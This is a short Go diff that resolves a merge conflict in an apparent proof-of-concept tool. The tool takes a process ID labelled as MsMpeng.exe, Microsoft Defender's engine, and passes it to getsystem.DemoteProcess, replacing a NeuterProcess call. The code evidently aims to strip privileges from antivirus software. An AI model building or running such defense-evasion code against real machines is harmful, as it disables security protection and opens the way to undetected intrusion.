@@ -10,11 +10,7 @@ import (
 
 func main() {
 	pid, _ := strconv.Atoi(os.Args[1]) // MsMpeng.exe
-<<<<<<< HEAD
 	err := getsystem.DemoteProcess(pid)
-=======
-	err := getsystem.NeuterProcess(pid)
->>>>>>> 906687c (PoC)
 	if err != nil {
 		log.Fatal(err)
 	}
